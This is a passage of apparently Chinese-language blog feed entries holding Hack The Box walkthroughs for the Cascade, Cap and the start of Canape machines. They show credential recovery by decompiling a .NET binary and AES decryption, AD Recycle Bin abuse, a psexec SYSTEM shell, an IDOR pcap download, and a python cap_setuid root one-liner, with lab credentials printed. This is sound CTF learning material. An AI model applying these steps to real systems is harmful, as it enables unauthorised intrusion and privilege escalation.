(19.5 KiloBytes/sec) (average 163.5 KiloBytes/sec)<br></code></pre></td></tr></table></figure><p>它似乎是在执行着什么：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> RunAudit.bat                                    <br>CascAudit.exe <span class="hljs-string">&quot;\\CASC-DC1\Audit$\DB\Audit.db&quot;</span> <br></code></pre></td></tr></table></figure><p>我复制到我windows机器中，它会报错：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">D:\新建文件夹&gt;CascAudit.exe <span class="hljs-string">&quot;.\Audit.db&quot;</span><br><br>未经处理的异常:  System.IO.FileNotFoundException: 未能加载文件或程序集“System.Data.SQLite, Version=1.0.112.0, Culture=neutral, PublicKeyToken=db937bc2d44ff139”或它的某一个依赖项。系统找不到指定的文件。<br> 在 CascAudiot.MainModule.Main()<br><br>[已退出进程，代码为 3762504530 (0xe0434352)]<br></code></pre></td></tr></table></figure><p>我需要将人家目录还原：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">PS D:\新建文件夹&gt; .\RunAudit.bat<br><br>D:\新建文件夹&gt;CascAudit.exe <span class="hljs-string">&quot;.\Audit.db&quot;</span><br>Error getting LDAP connection data From database: SQL logic error<br>no such table: LDAP<br>PS D:\新建文件夹&gt;<br></code></pre></td></tr></table></figure><p>好吧，我可以找个工具SQLite browser。kali自带该工具：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220424232557855.png" alt="image-20220424232557855"  /><p>在LDAP表中可以看到ArkSvc账户的加密口令BQO5l5Kj9MdErXx6Q6AGOw&#x3D;&#x3D;，加密算法未知：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220424232718182.png" alt="image-20220424232718182"  /><p>我可以看一眼ArkSvc属性：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\s.smith\Documents&gt; net user ArkSvc<br>User name                    arksvc<br>Full Name                    ArkSvc<br>Comment<br>User<span class="hljs-string">&#x27;s comment</span><br><span class="hljs-string">Country code                 000 (System Default)</span><br><span class="hljs-string">Account active               Yes</span><br><span class="hljs-string">Account expires              Never</span><br><span class="hljs-string"></span><br><span class="hljs-string">Password last set            1/9/2020 5:18:20 PM</span><br><span class="hljs-string">Password expires             Never</span><br><span class="hljs-string">Password changeable          1/9/2020 5:18:20 PM</span><br><span class="hljs-string">Password required            Yes</span><br><span class="hljs-string">User may change password     No</span><br><span class="hljs-string"></span><br><span class="hljs-string">Workstations allowed         All</span><br><span class="hljs-string">Logon script</span><br><span class="hljs-string">User profile</span><br><span class="hljs-string">Home directory</span><br><span class="hljs-string">Last logon                   1/29/2020 10:05:40 PM</span><br><span class="hljs-string"></span><br><span class="hljs-string">Logon hours allowed          All</span><br><span class="hljs-string"></span><br><span class="hljs-string">Local Group Memberships      *AD Recycle Bin       *IT</span><br><span class="hljs-string">                           *Remote Management Use</span><br><span class="hljs-string">Global Group memberships     *Domain Users</span><br><span class="hljs-string">The command completed successfully.</span><br><span class="hljs-string"></span><br><span class="hljs-string">*Evil-WinRM* PS C:\Users\s.smith\Documents&gt; </span><br></code></pre></td></tr></table></figure><p><a href="https://www.netwrix.com/what_is_active_directory_ebook.html?cID=70170000000kgEZ">AD Recycle Bin</a>有助于恢复已删除的 Active Directory 对象，而无需从备份中恢复、重新启动Active <a href="https://blog.netwrix.com/2017/01/31/active-directory-domain/">Directory 域</a>服务或重新启动域控制器 (DC)。让我们回顾一下没有回收站的对象恢复是如何工作的。ArkSvc账户的密码我无法知晓，或许我可以通过RPC将其改掉：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpcclient $&gt; getdompwinfo<br>min_password_length: 5<br>password_properties: 0x00000000<br>rpcclient $&gt; setuserinfo2 ArkSvc 23 <span class="hljs-string">&#x27;worldisend123!@#&#x27;</span><br>result: NT_STATUS_ACCESS_DENIED<br>result was NT_STATUS_ACCESS_DENIED<br>rpcclient $&gt; <br></code></pre></td></tr></table></figure><p>不过很抱歉，它因为权限拒绝了我。</p><h4 id="以ArkSvc身份登录目标："><a href="#以ArkSvc身份登录目标：" class="headerlink" title="以ArkSvc身份登录目标："></a>以ArkSvc身份登录目标：</h4><p>john or hashcat是猜解哈希的，当然我可以通过其他kerberos爆破工具爆破ArkSvc的弱口令，但我觉得那样会失去意义。那目前我除了一堆不知道做什么DLL与exe，没什么东西了，难道我要将其反编译么，我看了一眼机器的标签，好像是的，在它的标签中有Reversing，也就是逆向的意思，我还没正式接触过逆向，但我觉得可以试试，我可以用**<a href="https://github.com/dnSpy/dnSpy/releases">dnSpy</a><strong>，关于反编译后要做的第一件事，就是找到程序的入口，一般都为</strong>main**函数：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220424234545765.png" alt="image-20220424234545765"  /><p>尽管我没了解过C#，但是这些代码也会有一些熟悉的感觉，往下拉，会有一串看起来像密码的字符串：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220424234650292.png" alt="image-20220424234650292"  /><p>虽然写代码我不太行，但读代码改代码我觉得还是可以的，这片代码中最关键的一点就是 password变量被赋予的值，<strong>encryptedString</strong>是从<strong>SQLITE</strong>中读取到的PWD转换为字符串后的值，并将其与<strong>c4scadek3y654321</strong>一起解密，看起来<strong>c4scadek3y654321</strong>是一串明文密钥，获取它就是解密我从数据库中看到的ArkSvc用户的密码。但是我不知道它的加密算法，我不知该如何解密，或许我还需要看看其他文件：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220425000719800.png" alt="image-20220425000719800"  /><p>System.Data.SQLite.dll有一些publicKey，但似乎对我没什么用，它的key是一样的。我可以通过搜索功能去搜索一些关键字：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220425001205420.png" alt="image-20220425001205420"  /><p>在CascCrypto.dll我发现了另一串像是密钥的字符串<strong>1tdyjCbY1Ix49842</strong>：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220425001609086.png" alt="image-20220425001609086"  /><p>我可以去试着解密：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.devglan.com<span class="hljs-regexp">/online-tools/</span>aes-encryption-decryption<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220425002252499.png" alt="image-20220425002252499"></p><p>解密成功了，我获取到了ArkSvc账户的口令w3lc0meFr31nd。我可以试着去登录：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-u</span> ArkSvc <span class="hljs-literal">-p</span> w3lc0meFr31nd <span class="hljs-literal">-i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.182</span><br><br>Evil<span class="hljs-literal">-WinRM</span> shell v3.<span class="hljs-number">3</span><br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is</span> <span class="hljs-title">unimplemented</span> <span class="hljs-title">on</span> <span class="hljs-title">this</span> <span class="hljs-title">machine</span></span><br><br><span class="hljs-keyword">Data</span>: <span class="hljs-keyword">For</span> more information, check Evil<span class="hljs-literal">-WinRM</span> Github: https://github.com/Hackplayers/evil<span class="hljs-literal">-winrm</span><span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\arksvc\Documents&gt; <br></code></pre></td></tr></table></figure><h4 id="特权提升："><a href="#特权提升：" class="headerlink" title="特权提升："></a>特权提升：</h4><p>我记得ArkSvc是回收站组，它可以恢复已经被删除的活动目录中的对象：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-number">*E</span>vil-WinRM* PS C:\Users\arksvc\Documents&gt; Get-ADObject -filter <span class="hljs-string">&#x27;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&#x27;</span> -includeDeletedObjects<br><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><br>Deleted           : <span class="hljs-literal">True</span><br>DistinguishedName : <span class="hljs-attribute">CN</span>=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,<span class="hljs-attribute">DC</span>=cascade,DC=local<br>Name              : TempAdmin<br>                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059<br>ObjectClass       :<span class="hljs-built_in"> user</span><br><span class="hljs-built_in"></span>ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059<br><br><br><br><span class="hljs-number">*E</span>vil-WinRM* PS C:\Users\arksvc\Documents&gt; <br></code></pre></td></tr></table></figure><p>可以从回收站中找到TempAdmin用户，我记得史密斯曾在会议html中说过，他与管理员账户的密码一样。我可以查看它的具体信息：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\arksvc\Documents&gt; <span class="hljs-built_in">Get-ADObject</span> <span class="hljs-literal">-filter</span> <span class="hljs-string">&#x27;isdeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&#x27;</span> <span class="hljs-literal">-includeDeletedObjects</span> <span class="hljs-literal">-property</span> *<br>... ...<br><br>accountExpires                  : <span class="hljs-number">9223372036854775807</span><br>badPasswordTime                 : <span class="hljs-number">0</span><br>badPwdCount                     : <span class="hljs-number">0</span><br>CanonicalName                   : cascade.local/Deleted Objects/TempAdmin<br>                                <span class="hljs-built_in">DEL</span>:f0cc344d<span class="hljs-literal">-31e0-4866-bceb-a842791ca059</span><br>cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz<br>CN                              : TempAdmin<br>                                <span class="hljs-built_in">DEL</span>:f0cc344d<span class="hljs-literal">-31e0-4866-bceb-a842791ca059</span><br>codePage                        : <span class="hljs-number">0</span><br>countryCode                     : <span class="hljs-number">0</span><br>Created                         : <span class="hljs-number">1</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2020</span> <span class="hljs-number">3</span>:<span class="hljs-number">23</span>:<span class="hljs-number">08</span> AM<br>createTimeStamp                 : <span class="hljs-number">1</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2020</span> <span class="hljs-number">3</span>:<span class="hljs-number">23</span>:<span class="hljs-number">08</span> AM<br>Deleted                         : True<br>Description                     :<br>DisplayName                     : TempAdmin<br><br><br>... ...<br></code></pre></td></tr></table></figure><p>似乎我看到了它的密码，我记得这些文档中的口令是通过base64编码的，就像我最开始碰到的r.thompson一样：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;YmFDVDNyMWFOMDBkbGVz&quot;</span> | base64 <span class="hljs-literal">-d</span> <br>baCT3r1aN00dles<br></code></pre></td></tr></table></figure><p>我可以尝试PTH横向移动到目标中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./psexec.py cascade.local/administrator@10.10.10.182<br>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation<br><br>Password:<br>[*] Requesting shares on 10.10.10.182.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file BVfyUoYe.exe<br>[*] Opening SVCManager on 10.10.10.182.....<br>[*] Creating service kSzV on 10.10.10.182.....<br>[*] Starting service kSzV.....<br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands<br>Microsoft Windows [Version 6.1.7601]<br>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.<br><br>C:\Windows\system32&gt; <span class="hljs-built_in">whoami</span><br>nt authority\system<br><br>C:\Windows\system32&gt;<br></code></pre></td></tr></table></figure><p>我可以读取root.txt:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">dir</span><br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is CF98-2F06<br><br> Directory of C:\Users\Administrator\Desktop<br><br>11/08/2021  04:58 PM    &lt;DIR&gt;          .<br>11/08/2021  04:58 PM    &lt;DIR&gt;          ..<br>04/24/2022  01:23 PM                34 root.txt<br>             1 File(s)             34 bytes<br>             2 Dir(s)   6,599,135,232 bytes free<br><br>C:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">type</span> root.txt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Active Directory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Cap</title>
    <link href="/post/HackTheBox-Cap.html"/>
    <url>/post/HackTheBox-Cap.html</url>
    
    <content type="html"><![CDATA[<h3 id="HTB-Walkthrough-Cap"><a href="#HTB-Walkthrough-Cap" class="headerlink" title="HTB Walkthrough - Cap"></a>HTB Walkthrough - Cap</h3><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.245<br>Host is up (0.088s latency).<br><br>PORT   STATE SERVICE VERSION<br>21/tcp open  ftp     vsftpd 3.0.3<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)<br>|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)<br>|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)<br>80/tcp open  http    gunicorn                              <br>| fingerprint-strings:<br>|   FourOhFourRequest:<br>|     HTTP/1.0 404 NOT FOUND                                    <br>|     Server: gunicorn                                                 <br>|     Date: Sat, 22 May 2021 10:51:48 GMT<br>|     Connection: close                                                <br>|     Content-Type: text/html; charset=utf-8<br>|     Content-Length: 232<br>|     &lt;!DOCTYPE HTML PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;<br>|     &lt;title&gt;404 Not Found&lt;/title&gt;                                             <br>|     &lt;h1&gt;Not Found&lt;/h1&gt;               <br>|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;                         <br>|   GetRequest:                        <br>|     HTTP/1.0 200 OK                  <br>|     Server: gunicorn                 <br>|     Date: Sat, 22 May 2021 10:51:42 GMT                                      <br>|     Connection: close                <br>|     Content-Type: text/html; charset=utf-8                                   <br>|     Content-Length: 19386                                                    <br>|     &lt;!DOCTYPE html&gt;                  <br>|     &lt;html class=<span class="hljs-string">&quot;no-js&quot;</span> lang=<span class="hljs-string">&quot;en&quot;</span>&gt;                                           <br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>......<br>SF:eck\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n<span class="hljs-string">&quot;);</span><br><span class="hljs-string">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 133.13 seconds</span><br></code></pre></td></tr></table></figure><p>Nmap没有确定FTP可以被匿名访问：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518115604658.png" alt="image-20220518115604658"  /><p>有个IP config点击会打印IP信息，但参数是死的，IP是事先准备好的文件：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518115938462.png" alt="image-20220518115938462"  /><p>取于以下文章介绍：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://portswigger.net/web-security/access-control/idor<br></code></pre></td></tr></table></figure><h4 id="不安全的直接对象引用-IDOR-4"><a href="#不安全的直接对象引用-IDOR-4" class="headerlink" title="不安全的直接对象引用 (IDOR)4"></a>不安全的直接对象引用 (IDOR)4</h4><p>在本节中，我们将解释什么是不安全的直接对象引用 (IDOR)，并描述一些常见的漏洞。</p><h4 id="什么是不安全的直接对象引用-IDOR-？"><a href="#什么是不安全的直接对象引用-IDOR-？" class="headerlink" title="什么是不安全的直接对象引用 (IDOR)？"></a>什么是不安全的直接对象引用 (IDOR)？</h4><p>不安全的直接对象引用 (IDOR) 是一种<a href="https://portswigger.net/web-security/access-control">访问控制</a>漏洞，当应用程序使用用户提供的输入直接访问对象时会出现这种漏洞。IDOR 一词因出现在 OWASP 2007 Top 10 中而广为人知。然而，这只是可能导致绕过<a href="https://portswigger.net/web-security/access-control">访问控制的许多访问控制实施错误的一个示例。</a>IDOR 漏洞最常与水平权限提升相关，但也可能与垂直权限提升相关。</p><h4 id="IDOR-示例"><a href="#IDOR-示例" class="headerlink" title="IDOR 示例"></a>IDOR 示例</h4><p>有许多访问控制漏洞的例子，其中用户控制的参数值用于直接访问资源或功能。</p><h4 id="直接引用数据库对象的-IDOR-漏洞"><a href="#直接引用数据库对象的-IDOR-漏洞" class="headerlink" title="直接引用数据库对象的 IDOR 漏洞"></a>直接引用数据库对象的 IDOR 漏洞</h4><p>考虑一个网站，它通过从后端数据库检索信息，使用以下 URL 访问客户帐户页面：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//i</span>nsecure-website.com/customer_account?customer_number=<span class="hljs-number">132355</span><br></code></pre></td></tr></table></figure><p>在这里，客户编号直接用作在后端数据库上执行的查询中的记录索引。如果没有其他控制措施，攻击者可以简单地修改该<code>customer_number</code>值，绕过访问控制来查看其他客户的记录。这是导致横向权限提升的 IDOR 漏洞示例。</p><p>攻击者可能能够通过在绕过访问控制的同时将用户更改为具有额外权限的用户来执行水平和垂直权限提升。例如，其他可能性包括一旦攻击者登陆用户的帐户页面，利用密码泄漏或修改参数。</p><h4 id="直接引用静态文件的-IDOR-漏洞"><a href="#直接引用静态文件的-IDOR-漏洞" class="headerlink" title="直接引用静态文件的 IDOR 漏洞"></a>直接引用静态文件的 IDOR 漏洞</h4><p>当敏感资源位于服务器端文件系统的静态文件中时，通常会出现 IDOR 漏洞。例如，网站可能会使用递增的文件名将聊天消息记录保存到磁盘，并允许用户通过访问如下 URL 来检索这些记录：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//i</span>nsecure-website.com<span class="hljs-regexp">/static/</span><span class="hljs-number">12144</span>.txt<br></code></pre></td></tr></table></figure><p>在这种情况下，攻击者可以简单地修改文件名来检索另一个用户创建的脚本，并可能获取用户凭据和其他敏感数据。</p><p>在该站点有一个download按钮：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518120439844.png" alt="image-20220518120439844"  /><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/download/2</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.245<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.10.245/data/2<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br></code></pre></td></tr></table></figure><p>命令匹配规则似乎只是单纯的数字：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&gt;&gt; wget <span class="hljs-number">10.10</span>.<span class="hljs-number">10.245</span><span class="hljs-regexp">/download/</span><span class="hljs-number">0</span> <br></code></pre></td></tr></table></figure><p>是pcap文件，可以用wireshark打开</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518122122729.png" alt="image-20220518122122729"  /><p>在FTP会话的协议包中会有一组与在web站点看到管理员用户名一样的凭证，而且是登录成功的。nathan:Buck3tH4TF0RM3!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; ssh nathan@10.10.10.245                                          <br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.245 (10.10.10.245)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.10.245<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">nathan@10.10.10.245&#x27;</span>s password: <br>Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br>Last login: Thu May 27 11:21:27 2021 from 10.10.14.7<br>nathan@<span class="hljs-built_in">cap</span>:~$ <span class="hljs-built_in">cat</span> user.txt <br>db..............................<br></code></pre></td></tr></table></figure><p>在我遍历SUID发现python3.8可以设置uid：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">nathan@<span class="hljs-built_in">cap</span>:~$ <span class="hljs-built_in">getcap</span> -r / 2&gt;/dev/null<br>/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip<br>/usr/bin/ping = cap_net_raw+ep<br>/usr/bin/traceroute6.iputils = cap_net_raw+ep<br>/usr/bin/mtr-packet = cap_net_raw+ep<br>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep<br>nathan@<span class="hljs-built_in">cap</span>:~$ python3.8 -c <span class="hljs-string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span><br>root@<span class="hljs-built_in">cap</span>:~<span class="hljs-comment"># id</span><br>uid=0(root) gid=1001(nathan) <span class="hljs-built_in">groups</span>=1001(nathan)<br>root@<span class="hljs-built_in">cap</span>:~<span class="hljs-comment"># cat /root/root.txt </span><br>59..............................<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Canape</title>
    <link href="/post/HackTheBox-Canape.html"/>
    <url>/post/HackTheBox-Canape.html</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs BASH"><span class="hljs-comment"># Nmap 7.92 scan initiated Sun Apr 10 17:29:11 2022 as: nmap -sV -sC -Pn -T4 -p- -oA nmap.txt 